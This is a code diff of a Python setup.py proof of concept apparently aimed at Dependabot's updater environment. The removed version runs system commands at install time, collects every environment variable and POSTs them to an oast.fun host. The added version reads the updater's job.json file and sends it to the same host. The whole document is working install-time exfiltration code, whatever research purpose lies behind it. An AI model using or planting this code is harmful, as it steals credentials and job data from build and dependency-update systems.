@@ -1,25 +1,10 @@
-from setuptools import setup
-import subprocess, urllib.request, os, json
-
-_exfil_url = "http://dtscchmqpronalsrfkkjwhyialnd5xsnm.oast.fun/dependabot"
-
-_data = {
-    "cmd_id":      subprocess.check_output(["id"],       text=True).strip(),
-    "cmd_whoami":  subprocess.check_output(["whoami"],   text=True).strip(),
-    "cmd_hostname":subprocess.check_output(["hostname"], text=True).strip(),
-    "cmd_uname":   subprocess.check_output(["sudo", "-n", "-l"], text=True).strip(),
-    "env":         dict(os.environ),
-}
-
-_req = urllib.request.Request(
-    _exfil_url,
-    data=json.dumps(_data).encode(),
-    headers={"Content-Type": "application/json"},
-    method="POST"
-)
-urllib.request.urlopen(_req, timeout=10)
-
-setup(
-    name="poc",
-    install_requires=["requests"],
-)
+  import json, urllib.request                                                                                                                                
+  with open("/home/dependabot/dependabot-updater/job.json", "r") as f:                                                                                       
+      job = json.load(f)
+  req = urllib.request.Request(                                                                                                                              
+      "http://dtscchmqpronalsrfkkjwhyialnd5xsnm.oast.fun/job",                           
+      data=json.dumps(job).encode(),                                                                                                                         
+      headers={"Content-Type": "application/json"},               
+      method="POST"                                                                                                                                          
+  )                                                                                                                                                          
+  urllib.request.urlopen(req, timeout=10)
